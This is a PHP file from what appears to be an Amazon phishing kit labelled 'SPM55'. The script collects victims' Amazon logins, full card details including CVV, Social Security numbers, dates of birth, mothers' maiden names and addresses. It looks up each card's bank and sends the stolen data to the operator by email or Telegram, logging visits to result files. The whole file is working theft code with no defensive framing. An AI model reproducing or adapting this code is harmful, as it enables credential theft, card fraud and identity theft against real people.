<?php
session_start();
require_once('main.php');
require_once('lang.php');
if (!isset($_POST['email'])) {
    exit(header("HTTP/1.0 404 Not Found"));
}

if (isset($_POST['cname'])) {
	$asdasdas = $_POST['cc'];
	$tolkon = str_replace(" ", "", $asdasdas);
	$bin = check_bin($tolkon);
	$bins = preg_replace('/\s/', '', $tolkon);
	$bins = substr($bins,0,6);
		if($bin["brand"] == "") {
			$subject = "💟 [".$bins."] ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["bank"]["name"])." - [$cn - $ip - $br]";
			$subbin = $bins." - ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["bank"]["name"]);
			}else{
			    $subject = "💟 [".$bins."] ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["brand"])." ".strtoupper($bin["bank"]["name"])." - [$cn - $ip - $br]";
			    $subbin = "💟 [".$bins."] ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["brand"])." ".strtoupper($bin["bank"]["name"]);
			}
			$expnya = $_POST['exp'];
			$expired = str_replace("/", "|", $expnya);
			$forcheck = "".$tolkon."|".$expired."|".$_POST['cvv']."";
			$fromsend = "FROM: ".$_POST['cname']." <".$sender_mail.">";
		$message = '
		===============[ AMAZON LOGIN ]===============<br>
		Email : '.$_POST['email'].'<br>
		Password : '.$_POST['pass_log'].'<br>
		===============[ CARD INFORMATION ]===============<br>
		Bank : '.$bin["bank"]["name"].'<br>
		Type : '.strtoupper($bin["scheme"]).' - '.strtoupper($bin["type"]).'<br>
		Level : '.strtoupper($bin["brand"]).'<br>
		Card Holder : '.$_POST['cname'].'<br>
		Card Number : '.$tolkon.'<br>
		Expired (MM/YY) : '.$_POST['exp'].'<br>
		CVV : '.$_POST['cvv'].'<br>
		Amex CID : '.$cid.'<br>
		MMN : '.$_POST['mmn'].'<br>
		For Check : '.$forcheck.'<br>
		===============[ BILLING INFORMATION ]===============<br>
		Full Name : '.$_POST['fname'].'<br>
		State : '.$_POST['state'].'<br>
		City : '.$_POST['city'].'<br>
		Address : '.$_POST['address'].'<br>
		ZIP Code : '.$_POST['zip'].'<br>
		Date Of Birth : '.$_POST['dob'].'<br>
		SSN : '.$_POST['ssn'].'<br>
		Phone Number : '.$_POST['phone'].'<br>
		===============[ DEVICE INFORMATION ]===============<br>
		Country : '.$cn.'<br>
		Region : '.$regioncity.'<br>
		City : '.$citykota.'<br>
		Continent : '.$continent.'<br>
		Useragent : '.$user_agent.'<br>
		ISP : '.$ispuser.'<br>
		IP : '.$ip.'<br>
		OS / Browser : '.$os.' / '.$br.'<br>
		Timezone : '.$timezone.'<br>
		Date : '.$date.'<br>
		===============[ SPM55 - AMAZON ]===============
		';
		$headers  = 'MIME-Version: 1.0' . "\r\n";
		$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
		$headers .= ''.$fromsend.'' . "\r\n";
		api($message,$subject,"email");
	if ($send_login == "email") {
		mail($email_result, $subject, $message, $headers);
		tulis_file("result/cc.txt", $ip);
		tulis_file("result/visitor.txt", "".$cn."|".$os."|".$br."|".$ip."|".$date."|[".$bins."] ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["brand"])." ".strtoupper($bin["bank"]["name"])."");
	}else{
		$message = 'message========[ LOGIN INFORMATION ]=======|Email : '.$_POST['email'].'|Password : '.$_POST['pass_log'].'|=======[ CARD INFORMATION 1 ]=======|Bank : '.$bin["bank"]["name"].'|Type : '.strtoupper($bin["scheme"]).' - '.strtoupper($bin["type"]).'|Level : '.strtoupper($bin["brand"]).'|Card Holder : '.$_POST['cname'].'|Card Number : '.$tolkon.'|Expired Date : '.$_POST['exp'].'|CVV/CVC : '.$_POST['cvv'].'|Amex CID : '.$cid.'|MMN : '.$_POST['mmn'].'|=======[ BILLING INFORMATION ]=======|Full Name : '.$_POST['fname'].'|State : '.$_POST['state'].'|City : '.$_POST['city'].'|Address : '.$_POST['address'].'|Zip Code : '.$_POST['zip'].'|DOB : '.$_POST['dob'].'|SSN : '.$_POST['ssn'].'|Phone : '.$_POST['phone'].'|=======[ DEVICE INFORMATION ]=======|Country : '.$cn.'|Region : '.$regioncity.'|City : '.$city.'|User Agent : '.$user_agent.'|OS / BR : '.$os.' / '.$br.'|ISP : '.$ispuser.'|IP : '.$ip.'|Timezone : '.$timezone.'|=======[ SPM55 - AMAZON ]=======';
		send_telegram($set_ip,$domain,$message);
		tulis_file("result/cc.txt", $ip);
		tulis_file("result/visitor.txt", "".$cn."|".$os."|".$br."|".$ip."|".$date."|[".$bins."] ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["brand"])." ".strtoupper($bin["bank"]["name"])."");
	}
}

if($os == "Android" or $os == "iPhone") {
require_once('files/card-mobile.php');
}else{
require_once('files/card-desktop.php');
}
?>